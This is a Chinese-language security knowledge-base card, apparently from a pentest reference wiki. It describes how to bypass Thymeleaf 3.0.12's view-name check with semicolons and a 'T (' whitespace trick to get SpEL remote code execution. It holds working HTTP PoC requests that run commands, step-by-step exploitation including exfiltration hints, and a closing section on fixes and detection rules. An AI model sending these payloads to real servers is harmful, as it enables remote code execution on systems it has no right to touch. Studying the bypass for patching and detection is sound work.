---
id: web-java-expression-spel-thymeleaf-312-viewname-check-semicolon-bypass
title: Thymeleaf 3.0.12 视图名预处理 SSTI 绕过：URI 分号与 Spring cached path 归一化差异骗过 checkViewNameNotInRequest
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-viewname-check-semicolon-normalization-bypass
tags:
- ssti
- thymeleaf
- thymeleaf-spring5
- spring
- spel
- view-name
- filter-bypass
- path-normalization
- semicolon
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: Thymeleaf 3.0.12.RELEASE / thymeleaf-spring5 3.0.12.RELEASE（该版本新增 checkViewNameNotInRequest；3.0.11 及更早无此检查）
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T01:04:53+08:00'
  notes: '已对照原文与 img/07-24、39-40 核对：renderFragment 在 viewTemplateName 含 :: 时调用 checkViewNameNotInRequest；vn 来自 removeSemicolonContent 后的 cached path，requestURI 取原始 getRequestURI 并 unescape/pack；/doc;/ 与 /doc/;/ 使 contains(vn)=false，img/23 显示 found=false；最终 /doc;/__$%7BT%20(...)%7D__::.x 与 /doc/;/... 两种载荷均弹计算器（img/39/40）。卡内对第一道检查的机制、PoC、版本(3.0.12 vs 3.0.11)与原文一致；第二道 T( 空白绕仅在必要处串联，另有专卡。未复跑靶场。dedup 候选 3.0.11 基线/RuoYi 58887 双写/theme stored 均为不同检查或入口，非同链。'
url: /docs/web/java/expression/spel/web-java-expression-spel-thymeleaf-312-viewname-check-semicolon-bypass/
draft: false
kb_aliases:
- Thymeleaf 3.0.12 绕过
- checkViewNameNotInRequest 绕过
- SpringRequestUtils 绕过
- 分号绕过视图名校验
- removeSemicolonContent 差异
- 羊城杯 Thymeleaf
---

## 一句话结论

Thymeleaf 3.0.12 在 `ThymeleafView.renderFragment` 中新增 `SpringRequestUtils.checkViewNameNotInRequest`，要求视图名 `pack` 后必须是 `request.getRequestURI()` 或请求参数的子串；但视图名取自 Spring 已做 `removeSemicolonContent` 的 cached path，检查用的却是保留分号的原始 `getRequestURI()`。在路径段中插入 `;`（如 `/doc;/__${...}__::.x`）即可让两者不一致、绕过检查；再在 `T` 与 `(` 间加空格绕过 `containsSpELInstantiationOrStatic`，恢复 `__${...}__` 预处理的 SpEL 命令执行。

## 原理

- **入口**：Spring MVC 把视图名交给 `ThymeleafViewResolver`。`ThymeleafView.renderFragment` 判断 `viewTemplateName` 含 `::` 时：
  ```java
  SpringRequestUtils.checkViewNameNotInRequest(viewTemplateName, request);
  ...
  fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
  ```
  解析时 Thymeleaf 会对 `__${...}__` 做预处理，其中的 SpEL 表达式被求值。
- **3.0.12 第一道检查** `checkViewNameNotInRequest`：
  ```java
  String vn = StringUtils.pack(viewName);
  String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));
  boolean found = requestURI != null && requestURI.contains(vn);
  if (!found) { /* 再遍历请求参数做同样的 contains */ }
  if (found) throw new TemplateProcessingException(...);
  ```
  `pack` 会去掉 Java 空白字符并转小写，因此检查比较的是“归一化后的子串包含关系”。
- **两边数据来源不一致**：
  - 视图名来自 `DefaultRequestToViewNameTranslator.getViewName()` → `ServletRequestPathUtils.getCachedPathValue(request)` → `request.getAttribute(UrlPathHelper.PATH_ATTRIBUTE)`，该 lookup path 已经过 `UrlPathHelper.removeSemicolonContent`，**分号及其所在段内容被删掉**；
  - 检查用的是 `request.getRequestURI()` 的原始值，**保留分号**。
- 以 `/doc;/__${T (java.lang.Runtime).getRuntime().exec("calc")}__::.x` 为例：
  - cached path 归一化后 ≈ `/doc/__${...}__::.x`，视图名 `vn` ≈ `doc/__${...}__::.x`；
  - 原始 requestURI = `/doc;/__${...}__::.x`；
  - 原始 URI 中不存在连续的 `doc/__...`（实际是 `doc;/...`），`contains(vn)` 返回 false，检查通过。
- **第二道检查**：预处理的 `${...}` 在 `StandardExpressionExecutionExecutionContext.RESTRICTED` 下执行，`SPELVariableExpressionEvaluator.getExpression` 调用 `SpringStandardExpressionUtils.containsSpELInstantiationOrStatic` 拦截 `T(...)` 与 `new`。该检查要求 `(` 的前一个字符紧邻 `T`；写成 `T (`（或 `T%0a(`、`T%09(`）时检测不命中，而 SpEL 语法允许 `T` 与 `(` 之间有空白，仍按类型引用解析，于是恢复 `T(java.lang.Runtime)` 静态调用。
- 两道检查都只做**字符串层面的归一化/扫描**：第一道依赖两个不同来源的 URL 表示，第二道依赖字符相邻关系——这是整条绕过成立的根本原因。

## 触发条件

- Thymeleaf 3.0.12.RELEASE / thymeleaf-spring5 3.0.12.RELEASE（该版本新增上述防护；3.0.11 及更早没有这些检查，可直接注入）。
- Spring MVC + Thymeleaf，视图名可控且最终来自 URL 路径，例如：
  ```java
  @GetMapping("/doc/{document}")
  public void getDocument(@PathVariable String document) { /* 返回 void，view name 取 URI */ }
  ```
  或 Controller 返回 `"user/" + lang + "/welcome"` 一类拼接值。
- Spring 的请求映射允许路径中出现 `;`（默认 `UrlPathHelper` 会去掉分号内容后再匹配，因此 `/doc;/...` 仍能路由到 `/doc/{document}` 或 `/doc`）。
- 目标 Thymeleaf 使用 SpEL（Spring 集成默认），且表达式执行权限未进一步受限（无自定义沙箱）。

## 利用步骤

1. 确认版本与入口：响应头/报错栈出现 `thymeleaf-spring5-3.0.12.RELEASE.jar`；访问 `/doc/xxx` 能触发模板解析。
2. 先验证朴素载荷会被第一道检查拦截（如 `/doc/__${T(java.lang.Runtime).getRuntime().exec("calc")}__::.x` 返回 `View name is an executable expression...`）。
3. 构造分号异形 URL，使 cached path 与原始 requestURI 不一致：
   ```text
   /doc;/__${T (java.lang.Runtime).getRuntime().exec("calc")}__::.x
   ```
   或
   ```text
   /doc/;/__${T (java.lang.Runtime).getRuntime().exec("calc")}__::.x
   ```
4. URL 编码 `$`、`{`、`}`、空格等字符后发送（如 `%24%7B`、`%7D`、`%20`）；`T` 与 `(` 之间的空格也可用 `%0a`、`%09` 替代。
5. 观察命令执行（弹计算器/写文件/DNS 外带）；无回显时改用 SpEL 读取文件或构造外带请求。

## PoC

```http
GET /doc;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x HTTP/1.1
Host: target:8090
```

等价的第二形态：

```http
GET /doc/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x HTTP/1.1
Host: target:8090
```

脆弱入口示例（视图名来自 URI）：

```java
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);   // 返回 void，视图名由请求路径推导
}
```

## 变体与关联

- 变体：任意能让 `removeSemicolonContent` 结果与原始 URI 不同的位置——`/doc;/`、`/doc/;/`、路径段中 `;JSESSIONID=...` 等；也可结合 `%3B` 编码与多重斜杠。
- 变体：第一道检查绕过之后，第二道 `T(` 检查用空白绕过（见 [[web-java-expression-spel-thymeleaf-312-typestatic-whitespace-bypass]]）；若 `new` 也被拦，可用反射链（见 [[web-java-expression-spel-restricted-reflection-memshell]]）。
- 关联：[[web-java-expression-spel-thymeleaf-viewname-preprocessing-ssti]] 是 3.0.12 之前的基线 view-name 预处理 SSTI；本卡是其 3.0.12 防护绕过。
- 关联：[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]] 用 `$${}` 双写绕过的是另一个函数 `SpringRequestUtils#containsExpression`，与本卡的分号归一化差异不是同一机制，可按目标版本组合使用。

## 检测与防御

- 根本修复：不要把用户输入作为视图名；对 viewName 做固定映射/白名单，禁止路径直接推导视图名。
- 一致化校验：在同一份归一化后的路径上同时生成视图名和做校验；对原始 URI 与分号剥离后的路径都做检查，或直接拒绝视图名/路径中出现 `;`、`__${`、`::` 等语法字符。
- 升级依赖：跟进 Thymeleaf 官方 issue #809 与 thymeleaf-spring issue #256 的修复版本；不要仅依赖 `checkViewNameNotInRequest` 的字符串 `contains`。
- 检测：请求路径同时出现 `;`、`__${`、`%24%7B`、`T (`/`T%0a(`/`T%09(`、`::` 时告警；关注 `View name is an executable expression` 异常与 Thymeleaf 视图解析栈。
- 加固：模板目录只读；禁止上传覆盖模板；SpEL 使用受限上下文并考虑完全禁用 `T()`/`new` 的 AST 级校验。
